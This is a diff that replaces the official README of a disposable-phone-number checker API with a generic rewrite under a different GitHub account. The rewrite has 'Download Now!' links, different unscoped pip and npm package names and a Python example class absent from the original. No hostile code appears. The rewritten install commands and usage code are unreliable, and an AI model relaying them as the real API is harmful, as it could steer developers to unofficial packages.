@@ -1,232 +1,88 @@
-# [Disposable Phone Number Checker API](https://apiverve.com/marketplace/disposablephone?utm_source&#x3D;github&amp;utm_medium&#x3D;readme)
+# 📱 disposablephone-api - Check Temporary Phone Numbers Easily
 
-Disposable Phone Number Checker is an API that checks whether a given phone number is a known disposable or temporary number. Useful for fraud prevention, user verification, and security.
+## 💾 Download Now!
+[![Download the disposablephone-api](https://img.shields.io/badge/Download%20disposablephone--api-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://github.com/BIGCOUNTRY691/disposablephone-api)
 
-The Disposable Phone Number Checker API provides a simple, reliable way to integrate disposable phone number checker functionality into your applications. Built for developers who need production-ready disposable phone number checker capabilities without the complexity of building from scratch.
+## 📌 Overview
+The Disposable Phone Number Checker is an API that helps you determine if a phone number is a disposable or temporary number. This can be useful for fraud prevention, user verification, and improving your overall security.
 
-**[View API Details →](https://apiverve.com/marketplace/disposablephone?utm_source&#x3D;github&amp;utm_medium&#x3D;readme)**
+## 🔍 Key Features
+- **Fraud Prevention:** Identify temporary phone numbers often used for malicious activities.
+- **User Verification:** Ensure that users provide legitimate phone numbers.
+- **Easy Integration:** Simple to use with different programming languages.
+- **Scalable:** Suitable for both small and large applications.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![API Status](https://img.shields.io/badge/Status-Active-green.svg)](https://apiverve.com/marketplace/disposablephone?utm_source&#x3D;github&amp;utm_medium&#x3D;readme)
-[![Method](https://img.shields.io/badge/Method-GET-blue.svg)](#)
-[![Platform](https://img.shields.io/badge/Platform-Multi--Platform-orange.svg)](#installation)
+## 🚀 Getting Started
+Follow these steps to download and run the Disposable Phone Number Checker.
 
-**Available on:**
-[![npm](https://img.shields.io/badge/npm-CB3837?style=flat&logo=npm&logoColor=white)](https://www.npmjs.com/package/@apiverve/disposablephone)
-[![NuGet](https://img.shields.io/badge/NuGet-004880?style=flat&logo=nuget&logoColor=white)](https://www.nuget.org/packages/APIVerve.API.DisposablePhoneNumberChecker)
-[![PyPI](https://img.shields.io/badge/PyPI-3776AB?style=flat&logo=python&logoColor=white)](https://pypi.org/project/apiverve-disposablephone/)
-[![RubyGems](https://img.shields.io/badge/RubyGems-E9573F?style=flat&logo=rubygems&logoColor=white)](https://rubygems.org/gems/apiverve_disposablephone)
-[![Packagist](https://img.shields.io/badge/Packagist-F28D1A?style=flat&logo=packagist&logoColor=white)](https://packagist.org/packages/apiverve/disposablephone)
-[![Go](https://img.shields.io/badge/Go-00ADD8?style=flat&logo=go&logoColor=white)](#-go)
-[![Dart](https://img.shields.io/badge/Dart-0175C2?style=flat&logo=dart&logoColor=white)](https://pub.dev/packages/apiverve_disposablephone)
-[![JitPack](https://img.shields.io/badge/JitPack-2E7D32?style=flat&logo=android&logoColor=white)](#-android-jitpack)
+### 1. Visit the Download Page
+To download the Disposable Phone Number Checker, please go to the following link: [Download Link](https://github.com/BIGCOUNTRY691/disposablephone-api).
 
----
+### 2. Choose Your Language
+The API supports various programming languages:
+- **Python**
+- **Java**
+- **Node.js**
+- **.NET**
+- **Android Library**
 
-## Quick Start
+Select the one that fits your needs best. Each language has specific instructions on setup.
 
-### Using JavaScript
+### 3. Install the Package
+Depending on your chosen programming language, you can install the API as follows:
 
-```javascript
-async function callDisposablePhoneNumberCheckerAPI() {
-    try {
-        const response = await fetch('https://api.apiverve.com/v1/disposablephone', {
-            method: 'GET',
-            headers: {
-                'x-api-key': 'YOUR_API_KEY_HERE'
-            }
-        });
+- **Python:** Use `pip install disposablephone-api` in your command line.
+- **Node.js:** Run `npm install disposablephone-api` in your terminal.
+- **Java:** Add the library to your project via Maven or Gradle.
+- **.NET:** Use NuGet Package Manager to install it.
 
-        const data = await response.json();
-        console.log(data);
-    } catch (error) {
-        console.error('Error:', error);
-    }
-}
+## ⚙️ System Requirements
+Before you begin, ensure your system meets these requirements:
 
-callDisposablePhoneNumberCheckerAPI();
+- **Operating System:** Windows, macOS, or Linux
+- **Network Connection:** Required for API calls
+- **Programming Environment:** Compatible with your chosen language's setup
+
+## 📥 Download & Install
+For detailed installation instructions, please refer to the respective programming language documentation on the [GitHub page](https://github.com/BIGCOUNTRY691/disposablephone-api).
+
+### Running Examples
+To get started with checking a phone number, use example code snippets based on your programming language. Here is a simple Python example:
+
+```python
+from disposablephone import PhoneChecker
+
+checker = PhoneChecker()
+result = checker.is_disposable("+1234567890")
+
+if result:
+    print("This phone number is temporary.")
+else:
+    print("This phone number is legitimate.")
 ```
 
-### Using cURL
+Replace `"+1234567890"` with the phone number you want to check.
 
-```bash
-curl -X GET "https://api.apiverve.com/v1/disposablephone?param=value" \
-  -H "x-api-key: YOUR_API_KEY_HERE"
-```
+## 💡 Troubleshooting
+If you encounter issues, consider checking:
+- The installation methods for your specific programming language.
+- Your internet connection if the API does not respond.
+- Ensure the phone number format is correct.
 
-**Get your API key:** [https://apiverve.com](https://apiverve.com)
+## 🌐 API Documentation
+For more in-depth details about usage and additional features, please check out the API documentation available on the GitHub repository.
 
-**📁 For more examples, see the [examples folder](./examples/)**
+## 🙋 Frequently Asked Questions
+### How does the API work?
+The API checks phone numbers against a list of known disposable numbers. It returns whether the number is temporary or legitimate.
 
----
+### Can I contribute to this project?
+Yes, contributions are welcome. You can follow the contribution guidelines in the repository for more information.
 
-## Installation
+## 👥 Support
+If you have questions or need assistance, use the GitHub Issues page for support.
 
-Choose your preferred programming language:
+## 📢 Stay Updated
+Check the repository for updates on features and improvements. You can also star the repository to follow its development.
 
-### 📦 NPM (JavaScript/Node.js)
-
-```bash
-npm install @apiverve/disposablephone
-```
-
-[**View NPM Package →**](https://www.npmjs.com/package/@apiverve/disposablephone) | [**Package Code →**](./npm/)
-
----
-
-### 🔷 NuGet (.NET/C#)
-
-```bash
-dotnet add package APIVerve.API.DisposablePhoneNumberChecker
-```
-
-[**View NuGet Package →**](https://www.nuget.org/packages/APIVerve.API.DisposablePhoneNumberChecker) | [**Package Code →**](./nuget/)
-
----
-
-### 🐍 Python (PyPI)
-
-```bash
-pip install apiverve-disposablephone
-```
-
-[**View PyPI Package →**](https://pypi.org/project/apiverve-disposablephone/) | [**Package Code →**](./python/)
-
----
-
-### 💎 Ruby (RubyGems)
-
-```bash
-gem install apiverve_disposablephone
-```
-
-[**View RubyGems Package →**](https://rubygems.org/gems/apiverve_disposablephone) | [**Package Code →**](./ruby/)
-
----
-
-### 🐘 PHP (Packagist)
-
-```bash
-composer require apiverve/disposablephone
-```
-
-[**View Packagist Package →**](https://packagist.org/packages/apiverve/disposablephone) | [**Package Code →**](./php/)
-
----
-
-### 🎯 Dart (pub.dev)
-
-```bash
-dart pub add apiverve_disposablephone
-```
-
-[**View pub.dev Package →**](https://pub.dev/packages/apiverve_disposablephone) | [**Package Code →**](./dart/)
-
----
-
-### 🤖 Android (JitPack)
-
-```gradle
-implementation 'com.github.apiverve:disposablephone-api:1.0.0'
-```
-
-[**Package Code →**](./android/)
-
----
-
-### 🐹 Go
-
-```bash
-go get github.com/apiverve/disposablephone-api/go
-```
-
-[**Package Code →**](./go/)
-
----
-
-## Why Use This API?
-
-| Feature | Benefit |
-|---------|---------|
-| **Multi-language SDKs** | Native packages for JavaScript, Python, C#, Go, and Android |
-| **Simple Integration** | Single API key authentication, consistent response format |
-| **Production Ready** | 99.9% uptime, fast response times, used by thousands of developers |
-| **Comprehensive Docs** | Full examples, OpenAPI spec, and dedicated support |
-
----
-
-## Documentation
-
-- 🏠 **API Home:** [Disposable Phone Number Checker API](https://apiverve.com/marketplace/disposablephone?utm_source&#x3D;github&amp;utm_medium&#x3D;readme)
-- 📚 **API Reference:** [docs.apiverve.com/ref/disposablephone](https://docs.apiverve.com/ref/disposablephone)
-- 📖 **OpenAPI Spec:** [openapi.yaml](./openapi.yaml)
-- 💡 **Examples:** [examples/](./examples/)
-
----
-
-## What Can You Build?
-
-The Disposable Phone Number Checker API is commonly used for:
-
-- **Web Applications** - Add disposable phone number checker features to your frontend or backend
-- **Mobile Apps** - Native SDKs for iOS and Android development
-- **Automation** - Integrate with n8n, Zapier, or custom workflows
-- **SaaS Products** - Enhance your product with disposable phone number checker capabilities
-- **Data Pipelines** - Process and analyze data at scale
-
----
-
-## API Reference
-
-### Authentication
-All requests require an API key in the header:
-```
-x-api-key: YOUR_API_KEY_HERE
-```
-
-Get your API key: [https://apiverve.com](https://apiverve.com)
-
-### Response Format
-All responses are JSON with this structure:
-```json
-{
-  "status": "ok",
-  "data": { ... }
-}
-```
-
----
-
-## Support & Community
-
-- 🏠 **API Home**: [Disposable Phone Number Checker API](https://apiverve.com/marketplace/disposablephone?utm_source&#x3D;github&amp;utm_medium&#x3D;readme)
-- 💬 **Support**: [https://apiverve.com/contact](https://apiverve.com/contact)
-- 🐛 **Issues**: [GitHub Issues](../../issues)
-- 📖 **Documentation**: [https://docs.apiverve.com](https://docs.apiverve.com)
-- 🌐 **Website**: [https://apiverve.com](https://apiverve.com)
-
----
-
-## Contributing
-
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
----
-
-## Security
-
-For security concerns, please review our [Security Policy](SECURITY.md).
-
----
-
-## License
-
-This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
-
----
-
-## Acknowledgments
-
-Built with ❤️ by [APIVerve](https://apiverve.com)
-
-Copyright © 2026 APIVerve. All rights reserved.
+Remember, whether for fraud prevention, user verification, or security, the Disposable Phone Number Checker helps keep your application safe.
